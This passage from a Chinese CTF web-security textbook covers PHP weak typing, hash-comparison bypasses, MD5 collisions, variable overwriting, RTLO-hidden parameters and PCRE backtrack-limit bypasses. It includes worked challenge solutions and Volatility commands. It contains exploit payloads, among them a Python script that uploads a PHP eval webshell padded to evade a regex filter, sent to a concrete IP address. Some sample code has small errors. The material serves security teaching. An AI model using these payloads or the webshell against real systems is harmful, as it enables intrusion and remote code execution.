+<li>条件 1，字符串<code>$num</code>等于整数<code>0</code>，松散比较。字符串<code>$num</code>转换为整型，要求值为整型<code>0</code>，可为数字字符串"0"、前导数字字符串(如"0a")、非 numeric 或者前导数字（即纯字符，如"php"）。</li>
+<li>条件 2，字符串<code>$num</code>转换为布尔型。要求值为布尔型<code>true</code>,则<strong>不能为空字符串 ""及字符串 "0"</strong></li>
+</ul>
+<pre><code class="language-bash">// ?num=0a
+// ?num=php
+// PHP 8以下
+</code></pre>
+<h4 id="例题2-1"><a class="header" href="#例题2-1">例题2</a></h4>
+<pre><code class="language-php">&lt;?php
+$a = $_GET['a'];
+if ($a == 0 &amp;&amp; $a == "admin") {
+    echo 'flag{**********}';
+}
+</code></pre>
+<pre><code class="language-bash">?a=admin
+</code></pre>
+<h2 id="重要函数"><a class="header" href="#重要函数">重要函数</a></h2>
+<div class="table-wrapper"><table><thead><tr><th>函数名称</th><th>作用</th><th>特性</th></tr></thead><tbody>
+<tr><td><a href="https://www.php.net/manual/zh/function.is-numeric.php">is_numeric()</a></td><td>检测变量是否为数字或数字字符串</td><td>科学计数法</td></tr>
+<tr><td><a href="https://www.php.net/manual/zh/function.intval.php">intval()</a></td><td>获取变量的整数值</td><td>1. 成功时返回<code>value</code>的<code>integer</code>值，失败时返回<code>0</code>。 空的 array 返回     <code>0</code>，非空的<code>array</code>返回<code>1</code>。<br /> 2. 如果 base 是 0，通过检测 value 的格式来决定使用的进制<br />3. 科学计数法，7.1.0后发现变化</td></tr>
+<tr><td><a href="https://www.php.net/manual/zh/function.preg-replace.php">preg_replace()</a></td><td>执行一个正则表达式的搜索和替换</td><td>1.<code>/e</code>修饰符，代码执行</td></tr>
+<tr><td><a href="https://www.php.net/manual/zh/function.preg-match.php">preg_match()</a></td><td>执行匹配正则表达式</td><td>1.数组返回false <br /> 2. 换行 <br /> 3. 回溯次数限制绕过</td></tr>
+<tr><td><a href="https://www.php.net/manual/zh/function.in-array.php">in_array()</a>、<a href="https://www.php.net/manual/zh/function.array-search.php">array_search()</a></td><td>检查数组中是否存在某个值</td><td>如果没有设置strict，则使用松散比较</td></tr>
+<tr><td><a href="https://www.php.net/manual/zh/function.chr.php">chr()</a></td><td>返回指定的字符</td><td>1. 如果数字大于256，返回<code>mod 256</code></td></tr>
+<tr><td>json_decode()</td><td></td><td>1. 字符串null、不符合json格式的情况返回null</td></tr>
+</tbody></table>
+</div>
+<ul>
+<li>json_decode()</li>
+</ul>
+<pre><code class="language-php">var_dump(json_decode('1')); // int(1)
+var_dump(json_decode('false')); // bool(false)
+var_dump(json_decode('true')); // bool(true)
+var_dump(json_decode('null')); // NULL
+var_dump(json_decode('a')); // NULL
+
+// key 必须双引号 value 加双引号是字符串，不加是数字
+var_dump((array)json_decode('{"key":"value", "2":2,"3":"3"}'));
+
+/*
+ array(3) {
+  ["key"]=&gt;
+  string(5) "value"
+  [2]=&gt;
+  int(2)
+  [3]=&gt;
+  string(1) "3"
+}
+ */
+
+// 嵌套数组
+var_dump((array)json_decode('{"a":[1,[2,3],4]}'));
+</code></pre>
+<h3 id="例题分析-5"><a class="header" href="#例题分析-5">例题分析</a></h3>
+<h4 id="例题1-2"><a class="header" href="#例题1-2">例题1</a></h4>
+<pre><code class="language-php">&lt;?php
+$num = $_GET['num'];
+// 条件1 $num 不是数字字符串
+// 条件2 字符串$num与整数1松散比较相等
+// PHP8以下，前导数字字符串 ?num=1a
+if (!is_numeric($num) &amp;&amp; $num == 1) {
+    echo 'flag{**********}';
+}
+
+// PHP8以下，前导数字字符串 ?num=1235a
+if (!is_numeric($num) &amp;&amp; $num &gt; 1234) {
+  echo 'flag{**********}';
+}
+
+// $num 字符串长度最大为3，最大为999
+// 算术操作加法，$num 字符串转换为数字
+// 科学计数法 ?num=1e9
+if (strlen($num) &lt; 4 &amp;&amp; intval($num + 1) &gt; 5000)) {
+    echo 'flag{**********}';
+}
+</code></pre>
+<h4 id="例题2-2"><a class="header" href="#例题2-2">例题2</a></h4>
+<pre><code class="language-php">&lt;?php
+highlight_file(__FILE__);
+
+if (isset($_GET['money'])) {
+    $money = $_GET['money'];
+    if (strlen($money) &lt;= 4 &amp;&amp; $money &gt; time() &amp;&amp; !is_array($money)) {
+        echo 'flag{**********}';
+    } else {
+        echo "Wrong Answer!";
+    }
+} else {
+    echo "Wrong Answer!";
+}
+?&gt;
+</code></pre>
+<p>?&gt; <code>$money</code>为什么不能是数组？假设<code>$money</code>是数组，能否满足条件 1 和 2？</p>
+<p>在比较运算符中，运算数 1 类型为数组，与任何其他类型比较，数组总是更大。参考<a href="https://www.php.net/manual/zh/language.operators.comparison.php">比较运算符</a></p>
+<pre><code>?money=1e9
+?money[]=
+</code></pre>
+<h2 id="哈希函数比较"><a class="header" href="#哈希函数比较">哈希函数比较</a></h2>
+<p>计算字符串的散列值<a href="https://www.php.net/manual/zh/function.md5">md5()</a>、<a href="https://www.php.net/manual/zh/function.sha1.php">sha1()</a></p>
+<h3 id="0e开头"><a class="header" href="#0e开头"><code>0e</code>开头</a></h3>
+<pre><code class="language-php">&lt;?php
+// 松散比较不等，md5值相等
+if ($str1 != $str2) if (md5($str1) == md5($str2)) die($flag);
+</code></pre>
+<pre><code>md5('240610708') == md5('QNKCDZO')
+</code></pre>
+<h3 id="数组绕过"><a class="header" href="#数组绕过">数组绕过</a></h3>
+<p><code>md5(array)</code>，如果参数类型为数组，返回<code>NULL</code></p>
+<pre><code class="language-php">&lt;?php
+// 原字符串不全等，md5值全等
+if ($str1 !== $str2) if (md5($str1) === md5($str2)) die($flag);
+if ($str1 !== $str2) if (md5($salt.$str1) === md5($salt.$str2)) die($flag);
+
+// ?a[]=..&amp;b[]=...
+</code></pre>
+<h3 id="不同的数值构建一样的md5"><a class="header" href="#不同的数值构建一样的md5"><a href="web/">不同的数值构建一样的MD5</a></a></h3>
+<pre><code class="language-php">// 原字符串不全等，md5值全等
+if ((string)$str1 !== (string)$str2) if (md5($str1) === md5($str2)) die($flag);
+</code></pre>
+<ul>
+<li>选择前缀碰撞</li>
+<li>相同前缀碰撞，在两个不同的文件中共享相同的前缀和后缀，但中间的二进制不同。
+<a href="https://www.win.tue.nl/hashclash/">HashClash</a> 是一个用于 MD5 和 SHA-1 密码分析的工具箱，由 cr-marcstevens 开发。它可以用于创建不同类型的碰撞，包括选择前缀碰撞和相同前缀碰撞。
+使用已编译好的 Win32 工具<a href="https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip">fastcoll_v1.0.0.5.exe</a>可以在几秒内完成任务，过程如下：</li>
+</ul>
+<pre><code class="language-shell"># -p pre.txt 为前缀文件 -o 输出两个md5一样的文件
+.\fastcoll_v1.0.0.5.exe -p pre.txt -o msg1.bin msg2.bin
+</code></pre>
+<p>生成的两个不同的文件，便于发送，进行 URL 编码</p>
+<pre><code class="language-php">&lt;?php
+echo "msg1:" . urlencode(file_get_contents("msg1.bin")) . PHP_EOL;
+echo "msg2:" . urlencode(file_get_contents("msg2.bin")) . PHP_EOL;
+
+/*
+msg1:yes%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C3%DF%00W%ABi%1BR%EF%F5%FC%22%F6%E9%F8%F2%03%21%AF4v%3A%9B%E6W%B6A%95H%B8D%07%A9%DB%CC%DE%BC%E3%A2%1A%87%BAg%DB%DC%DB1%B4%9Da%5D%E8%E4%D0%D4%F4%EC%00%96c%A2%8B%1E%18%16%0AvrJ%E7%98%96X1%27I%D2%CE%28%1E%9Avb4%1C%EA%00%3D%24%5D%A4e%CF%EB-%EE%D1%27%7FX%98%9A%B1%C8bJ%09j%85%7C%AE%5C%12%7D%26%F3Y%BF%23%18%81%96%D1%FF%B8%E7Z%8B
+
+msg2:yes%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C3%DF%00W%ABi%1BR%EF%F5%FC%22%F6%E9%F8%F2%03%21%AF%B4v%3A%9B%E6W%B6A%95H%B8D%07%A9%DB%CC%DE%BC%E3%A2%1A%87%BAg%DB%DC%5B2%B4%9Da%5D%E8%E4%D0%D4%F4%EC%00%96%E3%A2%8B%1E%18%16%0AvrJ%E7%98%96X1%27I%D2%CE%28%1E%9Avb%B4%1C%EA%00%3D%24%5D%A4e%CF%EB-%EE%D1%27%7FX%98%9A%B1%C8bJ%09j%85%FC%AD%5C%12%7D%26%F3Y%BF%23%18%81%96%D1%7F%B8%E7Z%8B
+*/
+</code></pre>
+<ul>
+<li><a href="https://github.com/cr-marcstevens/hashclash">Project HashClash - MD5 &amp; SHA-1 cryptanalytic toolbox</a></li>
+<li><a href="https://github.com/corkami/collisions">GitHub - corkami/collisions: Hash collisions and exploitations</a></li>
+</ul>
+<h3 id="字符串的md5值等于其本身"><a class="header" href="#字符串的md5值等于其本身">字符串的MD5值等于其本身</a></h3>
+<pre><code class="language-php">if($str == md5($str)) die($flag);
+</code></pre>
+<p>寻找一个<code>0e</code>开头的字符串，且其 md5 值也是<code>0e</code>开头。</p>
+<pre><code class="language-php">&lt;?php
+for($i;;$i++) if("0e{$i}" == md5("0e{$i}")) die("0e{$i}"); 
+# 输出 0e215962017
+</code></pre>
+<h3 id="截断比较"><a class="header" href="#截断比较">截断比较</a></h3>
+<p>哈希字符串的指定位置等于某字符串</p>
+<pre><code class="language-php">if(substr(md5($str), 0, 6) == "******") die($flag);
+</code></pre>
+<p>采用暴力碰撞方式</p>
+<pre><code class="language-php">&lt;?php
+for($i;;$i++) if(substr(md5($i), 0, 6) == "******") die("$i"); 
+</code></pre>
+<h3 id="md5strtrue"><a class="header" href="#md5strtrue"><code>md5($str,true)</code></a></h3>
+<p>与 SQL 注入结合</p>
+<!--
+与SQL注入结合
+-->
+<p>练习题目</p>
+<ul>
+<li>2017-HackDatKiwi-md5games1</li>
+<li>2018-强网杯-web 签到</li>
+</ul>
+<h2 id="变量覆盖漏洞"><a class="header" href="#变量覆盖漏洞">变量覆盖漏洞</a></h2>
+<p>变量覆盖漏洞是指通过自定义参数值控制原有变量的值。</p>
+<ul>
+<li><a href="https://www.php.net/manual/zh/language.variables.variable.php">可变变量<code>$$</code></a> - 一个变量的变量名可以动态设置和使用</li>
+<li><a href="https://www.php.net/manual/zh/function.parse-str.php">parse_str()</a> - 将字符串解析成多个变量</li>
+<li><a href="http://php.adamharvey.name/manual/zh/function.extract.php">extract()</a> - 从数组中导入变量到当前符号表</li>
+<li><a href="http://php.adamharvey.name/manual/zh/function.import-request-variables.php">import_request_variables()</a> -  将 GET／POST／Cookie 变量导入全局作用域</li>
+</ul>
+<h3 id="例题分析-6"><a class="header" href="#例题分析-6">例题分析</a></h3>
+<p>题目来源：ISCC_2019_web4</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+include("flag.php");
+$hashed_key = 'ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a';
+$parsed = parse_url($_SERVER['REQUEST_URI']);
+if (isset($parsed["query"])) {
+    $query = $parsed["query"];
+    $parsed_query = parse_str($query);
+    if ($parsed_query != NULL) {
+        $action = $parsed_query['action'];
+    }
+
+    if ($action === "auth") {
+        $key = $_GET["key"];
+        $hashed_input = hash('sha256', $key);
+        if ($hashed_input !== $hashed_key) {
+            die("&lt;img src='cxk.jpg'&gt;");
+        }
+
+        echo $flag;
+    }
+} else {
+    show_source(__FILE__);
+}
+</code></pre>
+<h2 id="双引号字符串中含有rtlo等格式字符"><a class="header" href="#双引号字符串中含有rtlo等格式字符">双引号字符串中含有<code>RTLO</code>等格式字符</a></h2>
+<p><a href="https://www.w3.org/International/questions/qa-bidi-unicode-controls#basedirection">格式字符介绍</a></p>
+<p>RTLO 字符，全称为 Right-to-Left Override，是一个 Unicode 控制字符，编码为 U+202E。它的作用是改变文本的显示方向，使其从右向左显示，这对于支持阿拉伯语、希伯来语等从右向左书写的语言非常有用。</p>
+<pre><code class="language-php">echo "\u{202E}abc"; // cba
+</code></pre>
+<p>PHP 的代码高亮函数，其颜色显示是根据<code>php.ini</code>定义显示，注释、默认、HTML、关键词和字符串显示不同颜色。</p>
+<p><img src="http://oss.dropsec.xyz/book/phpinfo-highlight.png" alt="" /></p>
+<p>假设我们需要遇到这样一道题目，浏览器显示源码如图所示。</p>
+<p><img src="http://oss.dropsec.xyz/book/RTLO1.png" alt="" /></p>
+<p>图中有三个注释，其中第三个<code>//sha2</code>显示的颜色与前两个不同。原因在于真正的<code>$_GET</code>参数不是所谓看见的<code>sha2</code>，而是包含有控制字符的字符串，导致浏览器渲染显示时产生位置偏移，我们需要从十六进制层面获取真正的参数名称。可通过<code>burp</code>或<code>wireshark</code>抓包，也可以直接复制粘贴代码，获取参数值。由于是不可打印字符，发送时需要 URL 编码。</p>
+<p>在做题中，可以通过颜色判断或者鼠标双击选择变量，来发现是否设置了考点。</p>
+<ul>
+<li>Hack.lu CTF 2018 Baby PHP</li>
+<li>ISCC 2023 小周的密码锁</li>
+</ul>
+<h2 id="浮点数精度绕过"><a class="header" href="#浮点数精度绕过">浮点数精度绕过</a></h2>
+<ul>
+<li>
+<p>在小数小于某个值（10^-16）以后，再比较的时候就分不清大小了</p>
+</li>
+<li>
+<p>常量</p>
+<ul>
+<li><code>NaN</code>，</li>
+<li><code>INF</code>，无穷大</li>
+</ul>
+</li>
+<li>
+<p>题目</p>
+<ul>
+<li>ciscn2020-easytrick</li>
+</ul>
+</li>
+</ul>
+<h2 id="pcre回溯次数限制绕过"><a class="header" href="#pcre回溯次数限制绕过">PCRE回溯次数限制绕过</a></h2>
+<p>例题<a href="https://code-breaking.com/">Code-Breaking Puzzles</a>的<a href="https://github.com/phith0n/code-breaking/tree/master/2018/pcrewaf">pcrewaf</a></p>
+<pre><code class="language-php">&lt;?php
+// 判断是否是PHP代码
+function is_php($data){  
+    return preg_match('/&lt;\?.*[(`;?&gt;].*/is', $data);  
+}
+
+// 注意preg_match()的返回值，返回0 或false均满足条件
+if(!is_php($input)) {
+    // fwrite($f, $input); ...
+}
+</code></pre>
+<p>PCRE（Perl Compatible Regular Expressions）是一个 Perl 语言兼容的正则表达式库。PHP 采用 PCRE 库实现正则表达式功能。</p>
+<p>默认情况下，量词都是<code>贪婪</code>的，也就是说， 它们会在不导致模式匹配失败的前提下，尽可能多的匹配字符(直到最大允许的匹配次数)。</p>
+<p>然而，如果一个量词紧跟着一个<code>?</code>(问号) 标记，它就会成为懒惰(非贪婪)模式， 它不再尽可能多的匹配，而是尽可能少的匹配。</p>
+<p><code>&lt;?php phpinfo();?&gt;//aaaaaa</code>，执行过程如下：</p>
+<p>PCRE 的参数回溯次数限制<code>pcre.backtrack_limit</code>默认为<code>1000000</code>。</p>
+<p>如果回溯次数超过限制，<code>preg_match()</code>返回<code>false</code>，表示只执行失败。</p>
+<p>PCRE 回溯次数限制绕过的原理是通过发送超长字符串，使正则执行失败，最后绕过目标对 PHP 语言的限制。</p>
+<ul>
+<li>贪婪模式</li>
+<li>对返回值的判断不够严谨</li>
+</ul>
+<pre><code class="language-python">import requests
+from io import BytesIO
+
+files = {
+  'file': BytesIO(b'aaa&lt;?php eval($_POST[txt]);//' + b'a' * 1000000)
+}
+
+res = requests.post('http://51.158.75.42:8088/index.php', files=files, allow_redirects=False)
+print(res.headers)
+</code></pre>
+<h3 id="修复建议"><a class="header" href="#修复建议">修复建议</a></h3>
+<p>PHP 文档上有关于<code>preg_match</code>的警告，应使用全等<code>===</code>来测试函数的返回值。</p>
+<pre><code class="language-php">&lt;?php
+function is_php($data){  
+    return preg_match('/&lt;\?.*[(`;?&gt;].*/is', $data);  
+}
+
+if(is_php($input) === 0) {
+    // fwrite($f, $input); ...
+}
+</code></pre>
+<p><a href="https://www.pcre.org/">PCRE库</a></p>
+<p><a href="https://www.php.net/manual/zh/book.pcre.php">PHP正则表达式文档</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p>
+<h2 id="经典赛题分析"><a class="header" href="#经典赛题分析">经典赛题分析</a></h2>
+<h3 id="2021-强网杯-寻宝"><a class="header" href="#2021-强网杯-寻宝">2021-强网杯-寻宝</a></h3>
+<pre><code class="language-php">&lt;?php
+header('Content-type:text/html;charset=utf-8');
+error_reporting(0);
+highlight_file(__file__);
+
+// 过滤函数，将黑名单字符替换为空
+function filter($string)
+{
+    $filter_word = array('php', 'flag', 'index', 'KeY1lhv', 'source', 'key', 'eval', 'echo', '\$', '\(', '\.', 'num', 'html', '\/', '\,', '\'', '0000000');
+    $filter_phrase = '/' . implode('|', $filter_word) . '/';
+    return preg_replace($filter_phrase, '', $string);
+}
+
+if ($ppp) {
+    unset($ppp);
+}
+$ppp['number1'] = "1";
+$ppp['number2'] = "1";
+$ppp['nunber3'] = "1";
+$ppp['number4'] = '1';
+$ppp['number5'] = '1';
+
+// 变量覆盖漏洞
+extract($_POST);
+
+$num1 = filter($ppp['number1']);
+$num2 = filter($ppp['number2']);
+$num3 = filter($ppp['number3']);
+$num4 = filter($ppp['number4']);
+$num5 = filter($ppp['number5']);
+
+// $num1不能为数字字符串
+if (isset($num1) &amp;&amp; is_numeric($num1)) {
+    die("非数字");
+} else {
+ // 前导数字字符串，松散比较，num1=1025a
+    if ($num1 &gt; 1024) {
+        echo "第一层";
+  // 科学计数法，$num2=5e5
+        if (isset($num2) &amp;&amp; strlen($num2) &lt;= 4 &amp;&amp; intval($num2 + 1) &gt; 500000) {
+            echo "第二层";
+   // md5截断碰撞，$num3=61823470
+            if (isset($num3) &amp;&amp; '4bf21cd' === substr(md5($num3), 0, 7)) {
+                echo "第三层";
+    // 前导数字字符串0或纯字母字母串，$num4=aaaaaaa
+                if (!($num4 &lt; 0) &amp;&amp; ($num4 == 0) &amp;&amp; ($num4 &lt;= 0) &amp;&amp; (strlen($num4) &gt; 6) &amp;&amp; (strlen($num4) &lt; 8) &amp;&amp; isset($num4)) {
+                    echo "第四层";
+                    if (!isset($num5) || (strlen($num5) == 0)) die("no");
+     // json_decode返回值，通过恰当的 PHP 类型返回在 json 中编码的数据。值 true、false 和 null 会相应地返回 true、false 和 null。如果 json 无法被解码，或者编码数据深度超过了嵌套限制的话，将会返回 null 。
+     // 1. $num5=null 2. $num5=a
+                    $b = json_decode(@$num5);
+                    if ($y = $b === NULL) {
+                        if ($y === true) {
+                            echo "第五层";
+                            include 'flag.php';
+                            echo $flag;
+                        }
+                    } else {
+                        die("no");
+                    }
+                } else {
+                    die("no");
+                }
+            } else {
+                die("no");
+            }
+        } else {
+            die("no");
+        }
+    } else {
+        die("no111");
+    }
+}
+</code></pre>
+<p>EXP:</p>
+<pre><code class="language-php">ppp[number1]=1025a&amp;ppp[number2]=5e5&amp;ppp[number3]=61823470&amp;ppp[number4]=0aaaaaa&amp;ppp[number5]=a
+或
+ppp[number1]=1025a&amp;ppp[number2]=5e5&amp;ppp[number3]=61823470&amp;ppp[number4]=abcdefg&amp;ppp[number5]=null
+</code></pre>
+<h3 id="2022-iscc-冬奥会"><a class="header" href="#2022-iscc-冬奥会">2022-ISCC-冬奥会</a></h3>
+<pre><code class="language-php">&lt;?php
+
+show_source(__FILE__);
+
+$Step1 = False;
+$Step2 = False;
+
+$info = (array)json_decode(@$_GET["Information"]);
+
+if (is_array($info)) {
+
+ var_dump($info);
+    //  不能是数字或数字字符串
+ is_numeric(@$info["year"]) ? die("Sorry~") : NULL;
+ if (@$info["year"]) {
+        // 字符串与数字松散比较，前导数字字符串 $info["year"]='2022a'
+  ($info["year"] == 2022) ? $Step1 = True : NULL;
+ }
+    // $info["items"]必须是数组
+ if (is_array(@$info["items"])) {
+        // $info["items"][1] 是数组
+        // $info["items"]数组元素数量=3
+  if (!is_array($info["items"][1]) or count($info["items"]) !== 3) die("Sorry~");
+  // array_search() 松散比较，0 == "skiing"
+        $status = array_search("skiing", $info["items"]);
+  $status === false ? die("Sorry~") : NULL;
+  foreach ($info["items"] as $key =&gt; $val) {
+   $val === "skiing" ? die("Sorry~") : NULL;
+  }
+  $Step2 = True;
+ }
+}
+
+if ($Step1 &amp;&amp; $Step2) {
+ include "2022flag.php";
+ echo $flag;
+}
+</code></pre>
+<pre><code>?Information={"year":"2022a","items":["a",[],0]}
+</code></pre>
+<h3 id="2023-iscc-小周的密码锁"><a class="header" href="#2023-iscc-小周的密码锁">2023-ISCC-小周的密码锁</a></h3>
+<pre><code class="language-php">&lt;?php
+function MyHashCode($str) {
+ $h = 0;
+ $len = strlen($str);
+ for ($i = 0; $i &lt; $len; $i++) {
+  $hash = intval40(intval40(40 * $hash) + ord($str[$i]));
+ }
+ return abs($hash);
+}
+
+function intval40($code) {
+ // 位运算符，$code 向右移动32位
+ $falg = $code &gt;&gt; 32;
+ // $code向右移动32位后，若等于1
+ // $code 范围在 2的32次方---2的33次方-1
+ if ($falg == 1) {
+  // 位运算符，取反
+  $code = ~($code - 1);
+  return $code * -1;
+ } else {
+  // $code向右移动32位后，不等于1
+  return $code;
+ }
+}
+function Checked($str) {
+ $p1 = '/ISCC/';
+ if (preg_match($p1, $str)) {
+  return false;
+ }
+ return true;
+}
+
+function SecurityCheck($sha1, $sha2, $user) {
+
+ $p1 = '/^[a-z]+$/';
+ $p2 = '/^[A-Z]+$/';
+
+ if (preg_match($p1, $sha1) &amp;&amp; preg_match($p2, $sha2)) {
+  $sha1 = strtoupper($sha1);
+  $sha2 = strtolower($sha2);
+  $user = strtoupper($user);
+  $crypto = $sha1 ^ $sha2;
+ } else {
+  die("wrong");
+ }
+
+ return array($crypto, $user);
+}
+error_reporting(0);
+
+$user = $_GET['username']; //user
+$sha1 = $_GET['sha1']; //sha1
+
+// 注意 颜色区别，需要获取真正的参数
+$sha2 = $_GET['‮⁦//sha2⁩⁦sha2'];
+//‮⁦see me ⁩⁦can you
+
+if (isset($_GET['password'])) {
+ if ($_GET['password2'] == 5) {
+  show_source(__FILE__);
+ } else {
+  //Try to encrypt
+  if (isset($sha1) &amp;&amp; isset($sha2) &amp;&amp; isset($user)) {
+   [
+    $crypto,
+    $user
+   ] = SecurityCheck($sha1, $sha2, $user);
+            // 哈希函数的截断碰撞
+            // 设 $crypto === $user
+   if ((substr(sha1($crypto), -6, 6) === substr(sha1($user), -6, 6)) &amp;&amp; (substr(sha1($user), -6, 6)) === 'a05c53') {
+    //welcome to ISCC
+
+                // $_GET['password'] 不能包含 ISCC
+    if ((MyHashcode("ISCCNOTHARD") === MyHashcode($_GET['password'])) &amp;&amp; Checked($_GET['password'])) {
+     include("f1ag.php");
+     echo $flag;
+    } else {
+     die("就快解开了!");
+    }
+   } else {
+    die("真的想不起来密码了吗?");
+   }
+  } else {
+   die("密钥错误!");
+  }
+ }
+}
+
+mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 1e4) + rand(1, 1e4));
+?&gt;
+</code></pre>
+<ol>
+<li><code>$_GET['username']</code>哈希函数的截断碰撞，<code>username=14987637</code></li>
+</ol>
+<pre><code class="language-php">for($i;;$i++) if(substr(sha1($i), -6, 6) == "a05c53") die("$i");
+// 14987637
+</code></pre>
+<ol start="2">
+<li>取<code>$sha1='AAAAAAAA'</code>，得<code>$sha2=puxyvwrv</code></li>
+</ol>
+<pre><code class="language-php">echo '14987637' ^ 'AAAAAAAA'; // puxyvwrv
+</code></pre>
+<ol start="3">
+<li>调试代码</li>
+</ol>
+<pre><code>73  73
+83  3003
+67  120187
+67  4807547
+78  192301958
+yesyes79  7692078399
+84  307683136044
+72  12307325441832
+65  492293017673345
+82  19691720706933882
+68  787668828277355348
+787668828277355348
+</code></pre>
+<p>观察发现，在<code>intval40</code>参数值范围在 $2^{32}$~$2^{33}-1$，满足条件<code>$falg == 1</code>，其余情况，原样返回。我们只需破坏<code>ISCC</code>关键词，依然包含上方的流程，<code>%01%43SCCNOTHARD</code></p>
+<p>EXP:</p>
+<pre><code>?username=14987637&amp;password=%01!SCCNOTHARD&amp;%E2%80%AE%E2%81%A6//sha2%E2%81%A9%E2%81%A6sha2=AAAAAAAA&amp;sha1=puxyvwrv
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="信息泄露"><a class="header" href="#信息泄露">信息泄露</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="目录遍历"><a class="header" href="#目录遍历">目录遍历</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="命令注入漏洞"><a class="header" href="#命令注入漏洞">命令注入漏洞</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="代码注入漏洞"><a class="header" href="#代码注入漏洞">代码注入漏洞</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="文件上传漏洞"><a class="header" href="#文件上传漏洞">文件上传漏洞</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="php-文件包含漏洞"><a class="header" href="#php-文件包含漏洞">PHP 文件包含漏洞</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="跨站脚本攻击"><a class="header" href="#跨站脚本攻击">跨站脚本攻击</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="跨站请求伪造"><a class="header" href="#跨站请求伪造">跨站请求伪造</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="服务端请求伪造"><a class="header" href="#服务端请求伪造">服务端请求伪造</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-注入漏洞"><a class="header" href="#sql-注入漏洞">SQL 注入漏洞</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="php-反序列化漏洞"><a class="header" href="#php-反序列化漏洞">PHP 反序列化漏洞</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="xml外部实体注入漏洞"><a class="header" href="#xml外部实体注入漏洞">XML外部实体注入漏洞</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="jwt"><a class="header" href="#jwt">JWT</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="服务端模板注入漏洞"><a class="header" href="#服务端模板注入漏洞">服务端模板注入漏洞</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="取证"><a class="header" href="#取证">取证</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="日志分析"><a class="header" href="#日志分析">日志分析</a></h1>
+<h2 id="系统日志"><a class="header" href="#系统日志">系统日志</a></h2>
+<h3 id="windows"><a class="header" href="#windows">Windows</a></h3>
+<h3 id="linux"><a class="header" href="#linux">Linux</a></h3>
+<h2 id="应用日志"><a class="header" href="#应用日志">应用日志</a></h2>
+<h3 id="http-accesslog"><a class="header" href="#http-accesslog">HTTP access.log</a></h3>
+<pre><code>127.0.0.1 - - [07/Jun/2025:10:00:00 +0000] "GET /index.html HTTP/1.1" 200 2326
+</code></pre>
+<ul>
+<li><code>127.0.0.1</code>：客户端 IP 地址</li>
+<li><code>[07/Jun/2025:10:00:00 +0000]</code>：请求时间戳</li>
+<li><code>"GET /index.html HTTP/1.1"</code>：请求方法、请求的 URL 和 HTTP 版本</li>
+<li><code>200</code>：返回的 HTTP 状态码</li>
+<li><code>2326</code>：返回的字节数</li>
+</ul>
+<h4 id="sql盲注"><a class="header" href="#sql盲注">SQL盲注</a></h4>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="内存取证"><a class="header" href="#内存取证">内存取证</a></h1>
+<h2 id="volatility-3-工具"><a class="header" href="#volatility-3-工具">Volatility 3 工具</a></h2>
+<p><a href="https://volatility3.readthedocs.io/en/latest/">Volatility 3</a>是一款强大的内存取证工具，用于分析计算机内存转储（RAM dump）。</p>
+<h3 id="安装"><a class="header" href="#安装">安装</a></h3>
+<ul>
+<li><code>Kali Linux 2024.4</code> 及以后版本</li>
+</ul>
+<pre><code class="language-shell">$ sudo apt install pipx
+$ pipx install volatility3
+  installed package volatility3 2.26.0, installed using Python 3.13.2
+  These apps are now globally available
+    - vol
+    - volshell
+done! ✨ 🌟 ✨
+</code></pre>
+<p>导入符号表</p>
+<p>查看可用的插件：</p>
+<pre><code class="language-bash">vol -h
+</code></pre>
+<h3 id="常用方法"><a class="header" href="#常用方法">常用方法</a></h3>
+<p>使用 <code>-f</code> 选项指定内存转储文件。</p>
+<h4 id="进程信息"><a class="header" href="#进程信息">进程信息</a></h4>
+<pre><code class="language-shell">vol -f windows.pslist
+vol -f windows.psscan
+vol -f windows.pstree
+</code></pre>
+<p>cmdline</p>
+<pre><code class="language-shell">vol -f windows.cmdline
+</code></pre>
+<p>DLLS</p>
+<pre><code class="language-shell">vol -f windows.dlllist --pid
+</code></pre>
+<h4 id="网络信息"><a class="header" href="#网络信息">网络信息</a></h4>
+<pre><code class="language-shell">vol -f windows.netscan
+vol -f windows.netstat
+</code></pre>
+<h4 id="文件"><a class="header" href="#文件">文件</a></h4>
+<p>文件扫描</p>
+<pre><code class="language-shell">vol -f windows.filescan
+</code></pre>
+<p>导出文件</p>
+<pre><code class="language-shell">vol -f windows.dumpfiles ‑‑virtaddr &lt;offset&gt;
+vol -f windows.dumpfiles ‑‑physaddr &lt;offset&gt;
+</code></pre>
+<h4 id="注册表"><a class="header" href="#注册表">注册表</a></h4>
+<pre><code class="language-shell">vol -f windows.registry.printkey
+</code></pre>
+<pre><code class="language-shell">vol -f windows.registry.hash
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="密码学"><a class="header" href="#密码学">密码学</a></h1>
